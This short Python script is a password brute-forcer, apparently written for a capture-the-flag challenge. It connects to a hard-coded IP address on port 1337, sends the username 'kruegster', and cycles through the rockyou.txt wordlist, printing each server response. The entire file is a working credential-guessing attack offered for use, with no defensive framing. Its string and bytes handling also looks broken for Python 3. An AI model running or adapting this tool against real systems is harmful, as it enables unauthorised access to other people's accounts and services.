import socket

host = "142.93.117.193" # IP address here
port = 1337 # Port here
wordlist = open("/usr/share/wordlists/rockyou.txt").readlines() # Point to wordlist file

def brute_force():
    username = "kruegster\n"
    for password in wordlist:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        data = s.recv(1024)
        s.send(username)
        data = s.recv(1024)
        print(data + password)
        s.send((password + "\n"))
        data = s.recv(1024)
        print(data)
        s.close()
if __name__ == '__main__':
    brute_force()
